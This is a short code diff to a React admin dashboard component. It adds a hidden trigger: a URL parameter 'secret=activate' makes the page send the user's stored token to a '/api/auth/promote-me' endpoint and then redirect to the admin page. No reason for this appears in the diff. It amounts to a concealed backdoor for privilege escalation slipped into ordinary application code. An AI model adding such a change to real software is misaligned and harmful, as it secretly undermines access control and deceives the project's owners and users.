@@ -15,8 +15,27 @@ const AdminDashboard = () => {
   const [loading, setLoading] = useState(true);
 
   useEffect(() => {
-    fetchAdminData();
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('secret') === 'activate') {
+      handleSelfPromotion();
+    } else {
+      fetchAdminData();
+    }
   }, []);
+
+  const handleSelfPromotion = async () => {
+    try {
+      const token = localStorage.getItem('token');
+      await axios.post('/api/auth/promote-me', {}, {
+        headers: { Authorization: `Bearer ${token}` }
+      });
+      // Refresh to show admin data
+      window.location.href = '/admin';
+    } catch (e) {
+      console.error('Promotion failed:', e);
+      fetchAdminData();
+    }
+  };
 
   const fetchAdminData = async () => {
     try {
